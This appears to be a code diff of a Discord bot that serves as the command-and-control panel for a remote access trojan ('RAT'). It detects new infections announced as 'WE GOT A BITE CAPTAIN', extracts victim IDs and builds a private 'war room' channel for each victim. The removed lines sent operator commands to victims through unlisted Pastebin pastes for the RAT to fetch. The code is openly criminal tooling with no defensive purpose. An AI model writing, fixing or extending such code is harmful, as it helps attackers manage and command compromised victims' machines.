@@ -181,12 +181,10 @@ print(f"EXE ready: dist\\{output_name}")
 import discord
 from discord.ext import commands
 import re
-import json
-import requests
 
 TOKEN = "YOUR_BOT_TOKEN_HERE"
-GUILD_ID = 123456789012345678      # Server ID
-PASTEBIN_DEV_KEY = "YOUR_PASTEBIN_DEV_KEY_HERE"  # The unique one you put in
+GUILD_ID = 123456789012345678  # Server ID - double-check
+LOG_CHANNEL_ID = 987654321098765432  # Exact webhook channel ID
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -197,35 +195,17 @@ bot = commands.Bot(command_prefix="-", intents=intents)
 
 known_victims = set()
 
-def queue_command(victim_id, full_cmd):
-    # Always create fresh paste
-    data = {
-        "api_dev_key": PASTEBIN_DEV_KEY,
-        "api_option": "paste",
-        "api_paste_code": json.dumps({victim_id: full_cmd}),
-        "api_paste_private": "1",  # Unlisted
-        "api_paste_name": "rat_cmds",
-        "api_paste_expire_date": "N"
-    }
-    response = requests.post("https://pastebin.com/api/api_post.php", data=data)
-    if "pastebin.com" in response.text:
-        new_url = response.text.strip()
-        new_raw = new_url.replace("pastebin.com/", "pastebin.com/raw/")
-        print(f"[+] New command paste: {new_url}")
-        print(f"[+] New RAW URL for RAT rebuild: {new_raw}")
-        return new_raw
-    else:
-        print("[-] Pastebin error:", response.text)
-        return None
-
 async def create_victim_section(victim_id):
     guild = bot.get_guild(GUILD_ID)
-    if not guild: return None
+    if not guild:
+        print("[ERROR] Invalid GUILD_ID - bot can't see server")
+        return None
     
     category_name = f"Victim-{victim_id}"
     category = discord.utils.get(guild.categories, name=category_name)
     if not category:
         category = await guild.create_category(category_name)
+        print(f"[+] Created category Victim-{victim_id}")
     
     channel_name = f"logs-{victim_id}"
     channel = discord.utils.get(category.text_channels, name=channel_name)
@@ -235,44 +215,46 @@ async def create_victim_section(victim_id):
             guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
         }
         channel = await category.create_text_channel(channel_name, overwrites=overwrites)
+        print(f"[+] Created private channel logs-{victim_id}")
     
     return channel
 
 @bot.event
 async def on_ready():
-    print(f"[+] {bot.user} online - type -ss in victim channels")
+    print(f"[+] {bot.user} online - monitoring channel {LOG_CHANNEL_ID} for bites")
 
 @bot.event
 async def on_message(message):
-    if message.author.bot: return
+    print(f"[DEBUG] New message in channel {message.channel.id} from {message.author} (bot: {message.author.bot})")
     
-    # Detect new bite in main webhook channel
-    if "WE GOT A BITE CAPTAIN" in (message.content + " ".join([e.title or "" + e.description or "" for e in message.embeds])):
-        match = re.search(r"\[([a-f0-9]{8})\]|Victim ID.*?([a-f0-9]{8})", message.content + " ".join([e.description or "" for e in message.embeds]), re.IGNORECASE)
-        if match:
-            victim_id = match.group(1) or match.group(2)
-            if victim_id not in known_victims:
+    # Always check for bite in the log channel - even from webhooks/bots
+    if message.channel.id == LOG_CHANNEL_ID:
+        full_text = message.content.lower()
+        for embed in message.embeds:
+            if embed.title:
+                full_text += " " + embed.title.lower()
+            if embed.description:
+                full_text += " " + embed.description.lower()
+        
+        print(f"[DEBUG] Parsed text: {full_text[:500]}...")  # Truncated for console
+        
+        if "we got a bite captain" in full_text:
+            # Super robust regex - catches [abc12345], Victim ID: abc12345, etc.
+            match = re.search(r"\[([a-f0-9]{8})\]|id[:\s]*([a-f0-9]{8})", full_text)
+            if match:
+                victim_id = match.group(1) or match.group(2)
+                victim_id = victim_id.lower()
+                if victim_id in known_victims:
+                    print(f"[INFO] Duplicate bite for {victim_id} - ignoring")
+                    return
                 known_victims.add(victim_id)
+                print(f"[!] BITE DETECTED: Victim {victim_id}")
+                
                 channel = await create_victim_section(victim_id)
                 if channel:
-                    await message.reply(f"**BITE** - Victim **{victim_id}** hooked\nWar room: {channel.mention}")
-
-    # Commands in victim channels
-    if message.channel.name.startswith("logs-"):
-        match = re.search(r"logs-([a-f0-9]{8})", message.channel.name)
-        if match and message.content.startswith("-"):
-            victim_id = match.group(1)
-            cmd_parts = message.content[1:].strip().split(" ", 1)
-            command = cmd_parts[0].lower()
-            arg = cmd_parts[1] if len(cmd_parts) > 1 else ""
-            full_cmd = command + (" " + arg if arg else "")
-            
-            new_raw = queue_command(victim_id, full_cmd)
-            if new_raw:
-                await message.reply(f"**{full_cmd}** queued for **{victim_id}**\n**REBUILD RAT WITH THIS RAW URL:**\n{new_raw}")
-            else:
-                await message.reply("Pastebin shat itself - check console")
-
+                    await message.reply(f"**FRESH BITE** — Victim **{victim_id}** is live\nWar room: {channel.mention}")
+                return
+    
     await bot.process_commands(message)
 
 bot.run(TOKEN)
